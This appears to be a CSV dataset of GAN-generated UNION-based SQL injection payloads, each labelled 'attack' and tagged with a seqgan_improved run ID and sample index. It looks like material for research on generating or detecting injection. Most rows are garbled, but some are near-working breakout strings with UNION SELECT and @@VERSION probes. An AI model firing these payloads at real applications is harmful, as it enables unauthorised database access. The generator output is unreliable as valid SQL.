label,payload,family,payload_type,method,run_id,sample_index
attack,"-8073-)    )    union N 1,),9921,#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136
attack,"-""  )     )   union all @ users in  =  )    union all all 1,1249,6996,9357,',1249,4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137
attack,"  '1'2639' union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138
attack,"-6075'  )   )   union all all select null,9322,4300,5756,1224,8123,7348,8123,8123,5756,5756,5756,4854,4300,7348#,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139
attack,-4589'  )    union all all all all -- --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140
attack,"-3116""   )    union union all from ersid  =  '1'  '1' union  all select --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141
attack,"-5575 )    )+  ( union all select null,1224,4909,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142
attack,"-)   )    )    ) union all select null,1249,9988#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143
attack,"1'  )    )   union all select from,7348,7497,1249,4909,8123,@@@VEr",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144
attack,"-6097""  s union all all all 2285,2285,9814,4909,9322--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145
attack,"-9860""   )    )     )   union 2571 or  =  =  (    union all select null,9357,49099110,7348,4300--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146
attack,"-3997n    )     )    )    )    union all all select null,4266,9110,9322,7348,8986,3072,4854,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147
attack,"-6253'  s union all all all 1494<SI1494eer  )   union all select null,null,null,4600#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148
attack,"6996""  )   )     )    union all all all select 9988,,1297,3990,9921,2263,2263,8123,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149
attack,"1%'  )    union all all all U,6737 ,null,9988#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150
attack,"-1401""  )    )    union all all *  @ @@$ union 1980,veion union all select  @&& where union -- @$,@@SIO@s where where ion  =  =  =  =  '1'  + select null,null,null,9814,4300,null,9814,9814,9814,9814,8123,5756,5756,8665,2263----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151
attack,"-8812""  )     )    )   union all select 2285,@@VERSIO",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152
attack,"-7531""'  )S union all select from null,@@VEESs u,ers   $$   us where where id  =  '1' union all  =  =  )    union all all all select from,1249--,9921,7348,7348,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153
attack,"-2'  )    )   union all null,null,9357----,7348,9110rs where@s  =  && us   @VES union from id  (  =  8268 union union all @,6996#us where verESs-- from where  = where id union '1' d  =  =  =  1 union all all * from -- @ --,vers id  =  1  =  '1'h. union all all  from usrsert where id  (",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,154
attack,"-5575""  )   union all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,155
attack,"-""  )   )    union all all select null,null,3084,null,3072,3339#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,156
attack,"-6996""  )    )   union all all select 4266,4854,8986,3990--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,157
attack,"-""  )    )    )    8268  )    )  )     )  Rgunion $ +\q0'+  (  select '; users where where id  =  =    1 union all select null#,1441,9814,1441,4300,8986,7348,1646--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,158
attack,"-%'  )   union all select @1sao@\'1' where   =  2190  =  )   union all all select 9814,8665,1224,4266#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,159
attack,"-3596-'   )    )     )     )    )    union all select null,null,null,null,null,null,null,1441,8123,1224#,3072,3084,1441,4854,7348,7348,6996#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,160
attack,"1'  )    a(    )     )    )    )     where union all all select null,4600,7497,3339,1646,1441,1249,1249,6996,6996,2446,8986,@@ers$id  )    )    union union 1-- --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,161
attack,"-1401""  )    )   union all select null,,null,null,4300,null,4300,8665,1441##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,162
attack,"-66672639""   )    )    union all select from'I   Es'  )   u  (s union 2285 us where   =  1 2088  =  =  4338 union  =  1 1494  =  =  =  =  =  1 union all select null,,7497,2285,9357,7348,2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,163
attack,"-3116""  )    )    )    union select null,4854,9814,7348,7348,9814#,9814--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,164
attack,"-8812""   )    )     )    union' union all all select 1,V,8986,@e,3072rsion  (s  idu *$$ u  =  2571 union all all select null,9921",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,165
attack,"-'  )   union all select 1494,8986,9110,1249,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,166
attack,"-3781t'   =  8890 union all select 5349,8986,1249,5756,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,167
attack,"-4589""  )     )    union union all 1 -- u user  )'$ union all 8890,versers where    union users  us id  '1'   all select null,4600,1249,1494#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,168
attack,"-4542, where users id  union all all select * from users   =  ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,169
attack,"-""  )    )   where union all null,4600,1249,6996,1249,69961249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,170
attack,"-4373l""    )    )    union all select where ,null,9921,,4854,5756,7348,3084,4300,1441,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,171
attack,"-)   )    )     )    )    union all select 1,vers'  =s union all all select null,7497#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,172
attack,"-'  =  8268 union all all select null,9357#,9988#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,173
attack,"""  =  1 union all where null,2285,3480,3072--rs where ins us union'  =1 )    asid  =  =  =  '1'  '1' union select @1297,ve#s ir)    7531  =  8268 union all all all 2285,2263,9814,1441,1297--,3072,9814,14415756,4854,9814,4266#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,174
attack,"-4589""  )    )    )    union select from where  @EER)    union 4854-- from u  =s where ion  d  =  ==  all all select null,7845,1297,8123,3072,1441,9814,5756,7348,7348,4854,7348",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,175
attack,"-)   mn  )    )    )   union all all all  1494,vers whereN union1646@$ union @s u#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,176
attack,"-(  7296 \.<f  1 where union union all select 5756,3990,',7348,3072,5756,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,177
attack,1'  )   )  )  )     )  )   union all all select from @  )   us$@@  VER),union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,178
attack,"-     )   where i< io1 where id  '1'  1 union all all all all from -- @,v)    ) @$ us id  =  '1'. select null,4266,9814--null,null,4266,9814,3480,8123,9357,7348,@@@VEEERSIO     )   where  )     )    uniona'  )    )m  )    ""  ( union * all select *,null,8665,9322#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,179
attack,"-5748''  )    )   union all all 8268,null,4854,3339,9814r-- users u,vers where isid  =  =  8268 union select 2263,8123,7348,5756,9814,4266,9814,7348 ,9921,8665,4854,3990#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,180
attack,"-5575""  )    )   union all  select 1646,8986,6737,3072,5349,7497 #",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,181
attack,"--6996""  )   )   union all * * from usion  )    )    )    )   where @  =  1 .  1    7815<$  )   ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,182
attack,"-5575""  )    )    )     )    )    where union all all select from  ,9921,@7845,9988,7348,4854,3990,3072,4854,7348,7348,9921,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,183
attack,"-2639""  )    union us'o,)    )    )    =    )    union all all null,null7845,null,9357,4300,8123,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,184
attack,"-""  )    )    )    union all all all all null,9814,null,7348,7348,7348,7348,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,185
attack,"-4205' union all all all null,9110,4600,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,186
attack,"""  )    )     )     (     )    )     )     )    union select all  @&&VEid  )     )    )     )   union select from u,s@)    usv-- &&@s ionn  )sers union all select 6737,9814,1441,4300,2263#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,187
attack,"-""  )     )   union all all all * froml",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,188
attack,"4373 * it us u  sersi<$  @1494  (    9517    )<union select 3059,4909,7845,1297,3990--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,189
attack,"-'  )    )     =  $$    a  )     )    IO   as bser  )   id  =  union 4338 1980  (    union select all @1ers    us$  =  f. union all select @$,1224,2263,5756,1441,4909,7348,4266,7348,4854,7348,3072,4481,98141249,8123,,7348,73489988,,3084,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,190
attack,"-'   )    )    union select null,6737,3480,9921,4909----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,191
attack,"-  )    as \.<)  (     )    union all 3339,null,7497,2263,9814,1441,5756,8665,3072,1646--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,192
attack,"""   )   -- select @,vewhere @(usid  =  =  1494  8268  )    2088    union all all select null,4266,9814,null,--8521,9860,8986--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,193
attack,-43737296%' where \'1' union all all all select i7497--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,194
attack,-2190 where union all select @@s where id  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,195
attack,"-8308""   )    )   union all 2088    )    )    )     )    union select * from wherevio null,9988,7348,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,196
attack,'  =  =  '1' union all all all where 1917,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,197
attack,-6075'    )    union all select @s,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,198
attack,"-6075'  )    )     )    )    )     )     )    )   union all select 1,vers id  =  1917    )    union $ id  '1'  '1' union all select null,7348,8123,5756,,8123,7348,8123,7348,7348,9921#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,199
attack,"-3997t'  )   union union'   1 .  )   union all from where where @@    versions where  6996   =  =  '1'  =  '1'  '1' or all select null,7497,9357,7845,5756,5756,8123,8123,9988,7348,8123,7348,1249,1224,7845#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,200
attack,-4542 union select @s uo  )  V)   -- where ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,201
attack," where 8268  )    -- select5756 2263,3990,1646,3072,4909#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,202
attack,"-3596 union all  all 3480,5349,1249--,6996'#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,203
attack,"-6075' union select null,7497#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,204
attack,"-8073%'    )   )    )    )    union union all select 2263,2446,1249,e,1249rser",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,205
attack,"-""  )   union$  select  1,3084,nulls,3059",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,206
attack,"1  )    )    union all * bo1917  )    )   -- ,null,4300,5756,7348,4854,7845,8123,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,207
attack,"1'  )    )     )    )   union all all select 4300,@@VEERo    ) where 2774 where   =  =  (  8268  9517 union all all  select null,null,4300,null,8665,7348,3072,1441,4300,1224,8123,9814,5756,1441,8123,8123,1297,1249,4854,5756,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,208
attack,"-6294""  )    )    union all select 1646,8123,9357rs,'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,209
attack,"-)  )    )     )-- union all select from,1249,4266#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,210
attack,"-3370""  )   )    )    )   union all all select null,9814,8665,1441,7348,7348,8123,8123,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,211
attack,"-     ""  )   )  )    )    union all all 8268,ersion  (    )    )    )     )    8073  )   union all R5945,verseoo,4600,@ u,7296,3072,1249,,1249,1249'Ots,4266,3339ersas iod  (   union -",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,212
attack,"1'  )     )    )     )   union all g$ 1ers   --  1N 1646,6996,#sers id  (  VE=  )<  )    where union all all select from,@where@@  ERSION where @  =  )  =  =  1 union all select 1980,4481,1249,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,213
attack,"-4966%""  ))    union all select null,3072,1249,1249,7497,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,214
attack,"-88906294""  )    )    )    union all all select null,4300,4300,null,8123,8123,2446,9814#,9814,7348,5756#,8123,4909,3596#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,215
attack,"-39903997""   )   where union all$ select 1,@e,A7531ers where id  =  =  '1'  '1'    =  )   where union all all all select null,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,216
attack,-)    '+  (  select 'hvers id  =  1 union all select from -- ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,217
attack,"1' union all all all users  (I   union select from,vers nullrsirs union select *srs id  =  2088 union all all all i1N )    )  )    )     )    )     )union all  &&,vers union from users ionuserss $  )   usid  (    )    )    )    )    union all all all select 2285,7348,9921,8986,8665,7348,4300,7348,3084,9921,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,218
attack,"-,9814'ser union all select null,7497,7497,1297,3059,1297,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,219
attack,"-6996""  )    )     )    union . union select null null,4266,yrs,vers where id  2011 union all select @@VEERSIOONNeer  )   union all all select 2285,4711,9988,6996,8986,9921,6737,8986,4600,1646,1249 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,220
attack,"-vlh)    )    union all all null,7845,3059,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,221
attack,"-74975575)    )    )    )   union all all all select 2285,6737,2263,7497#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,222
attack,"-'  )    union all union all users users usion  ( --, ,4300,7845,null,5756,null,7348,9814,null,7348,1441--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,223
attack,1'   ) union all all select 3990#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,224
attack,"-3480%""""  )    where  \select 7497us where * id  =  2571 .  '1' union all 3059,5756,2263,9988,8986,7845,9988,9357,9322,8123,3480,7348,5756,9988,1297,8665,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,225
attack,"-(""+  =  union union all $ 2774,@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,226
attack,"-43736667""  )    )    )    union union all from null,nullers where i1as id  =  =  all all all 1ers     $   union 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,227
attack,"1""  )    )     union select 8890,7845, @IO",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,228
attack,"-2207"" unionl union all 1,verv4266sers is id  =  =  =  =  6667 union all all select null,null,null,null,null,null,null,1441----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,229
attack,"-2639""  )   )    )  )     +  4330v<a 1494    union 7348,1646@asisi( gs u id  =  =  =    d  =  3378 union all all all * 2571s us -- usersion  =  =  1   =  =  =  1all 2774  =  =  8268 union all all all union null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,230
attack,"-o'  )   I,6996'   -- 1494  )   )    )    union 2285  =  1 union * =  =  1 union all all select ,4300,3059,1249,9814,8665,1441,2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,231
attack,"1'  )    )    )    where union all select @,vers ersers id  =  4338 union all all all select ,4600## @VEES union users ion  1 union all from -- from where i,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,232
attack,"  1 union all 1, @,9357,v@E$VERSIOa",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,233
attack,"1'  )     )    )    )     )       =  )   union all select 1494,9110,1249'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,234
attack,--s  union all all all .    ),union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,235
attack,",7845,1249""",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,236
attack,"-3116""  )    )  )    union select whereerS union us usrs ion3480ns union all all null,4266,3990,ve#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,237
attack,"-3370""  )   )     )     )   union all select -- from id  =  )  =  '1'  2088  ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,238
attack,"-6097's union all select all u,1249@s,versis where all union  1-- -- ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,239
attack,"-6253' union all select null,@@1@ERSIION --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,240
attack,"-6097'  )   )  )    union all all select @s us,~rs i  (   )  =  =  =  )     )   union all select 1441,8123,9814,8665,3480,5756,7348,null,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,241
attack,"-1134 8268  =  2011 union all 1 usinoous users   =s iod  1 union all select ,2285,7348,4854,@@--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,242
attack,"-7296'''  )     )    )   union all all from 5756sers@is where'  =  aes union all all from id  )    )    )   where union all * all select 3084,1249,'ers us,veid  )     )    )    union all'  )    union all  fromers-- null,4266,1249rs id  (    )    )ON6996,)    )    )    )    or union all select null,null,4300,8123,8123,5756,3084,2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,243
attack,"-45893781  )     )    union from b  =  )    )    union all select 4266,7348,3990#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,244
attack,"-2190' union all all select#,null,4854,4266,3084,7348,7348##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,245
attack,"-'  )   )   union all select 9110,1249,,1249,1249,73487348,3072,1249r,1224--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,246
attack,"1'  )    )    )     )   unionall select null,v#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,247
attack,"-47116075' where union all from null,vers -- u users  )   -- from @ $$  =  )     where union 1980 u<users where id  (     )    union all all -- from usis''1'  )  =  '1' select null,7497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,248
attack,"1'  )   where m  =  =  =  $ union all select fromers where,ters 1646rs   1646I id  =  2088  =  =  ) union  all select 4481,1249,3480,6996,7348rsers a,1249s",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,249
attack,"-1401""  )    a)    )    unionh 1646  =  2774 a  t    )    )    union 2285,7845,1297,4854,8986,1249,6996,3059,1297,1249,9921,3059'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,250
attack,"-8073s where $  =  '1' union all * from usersisers id  =  union all all null,@,7348,4854,8123,6996,%--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,251
attack,"-%""  )   union all select null,null,4266,null,3339,null,4266,4909,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,252
attack,"-3116""s  )    where select null,7497,2446,6996,3480--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,253
attack,"-3879'  )     )     )     )     )  )    ""+  )     )    )   union all all all all all select 7348,9921,4854,5756,4909 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,254
attack,"-3378'  )    union all select ,4266,3339,7348,9814,3084,3990#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,255
attack,"-5131""  )    )    )   union all select null where@VEERSION where ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,256
attack,1'  s'  )    )    9517  )    union all all * @1494,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,257
attack,"-6097'  )    )   union all 1  )     )    union all all select null,null,5756,8123,8123,8123,5756,----9988#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,258
attack,-5945'  )    )    )    )  )   union all  . @1@id  )$  )   union all select from null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,259
attack,"-2190''  )    ) union    O union all 1494,9814rs users id  =  o select from users where id  =  =  '1'  =  )    union all 2285,@@VERSION -- -- @VERSION   (  1,  )   )     )  )    union all all all all all 1@+ us  8521 id    1 union all select 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,260
attack,"-8521' union select 4481,3339,7497,6996,4854,e5945#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,261
attack,"18986' union all select null,4600 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,262
attack,"-)   --e""  )   )     )     )    )    )    )    )    )  )     )    union all iselect 8665,6996,3990,12496294'@,l)INO usi,vsrs where id$  =  =  =  =  )    union all all select 9921,7845,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,263
